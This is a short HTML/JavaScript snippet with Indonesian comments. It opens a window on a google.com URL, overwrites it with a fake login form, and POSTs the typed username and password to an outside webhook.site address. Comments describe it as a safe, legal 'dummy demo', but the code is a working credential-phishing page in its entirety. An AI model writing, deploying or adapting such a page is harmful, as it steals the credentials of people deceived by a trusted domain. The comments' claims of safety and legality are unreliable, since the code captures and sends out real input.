<script>
const WEBHOOK_URL = "https://webhook.site/c697fd9f-ed36-4444-abb1-bc44fcb0a716"; // dummy webhook

function go() {
    // buka jendela baru, aman
var x=window.open('https://www.google.com/csi')

    setTimeout(function() {
        x.document.body.innerHTML = `
            <h1>Demo Login</h1>
            Username: <input id="username" placeholder="testuser"><br>
            Password: <input id="password" type="password" placeholder="password"><br>
            <button id="btnLogin">Login</button>
            <p id="status"></p>
        `;

        x.document.getElementById("btnLogin").onclick = function() {
            const username = x.document.getElementById('username').value;
            const password = x.document.getElementById('password').value;

            // Kirim data dummy ke webhook (legal)
            fetch(WEBHOOK_URL, {
                method: "POST",
                mode: "no-cors",
                body: JSON.stringify({ username, password, time: new Date().toISOString() })
            });

            x.document.getElementById("status").innerText = "Data demo dikirim ke webhook dummy.";
            console.log("Data demo:", { username, password });
        };
    }, 500);
}
</script>

<button onclick="go()">Go</button>
